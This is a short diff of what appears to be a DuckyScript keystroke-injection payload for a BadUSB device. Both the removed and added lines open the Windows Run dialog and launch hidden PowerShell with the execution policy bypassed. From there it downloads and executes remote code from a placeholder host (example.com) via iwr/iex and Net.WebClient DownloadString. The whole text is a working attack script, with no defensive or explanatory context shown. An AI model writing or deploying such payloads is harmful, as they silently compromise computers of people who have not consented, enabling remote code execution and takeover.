@@ -9,9 +9,9 @@ DEFINE DOWNLOAD_LINK example.com
 
 DELAY 2000
 GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr 
-STRING DOWNLOAD_LINK
-STRING ; iex $pl
-DELAY 500
+DELAY 50
+STRING powershell -w h -NoP -NonI -Exec Bypass
+ENTER
+DELAY 1000
+STRING IEX (New-Object Net.WebClient).DownloadString(DOWNLOAD_LINK)
 ENTER
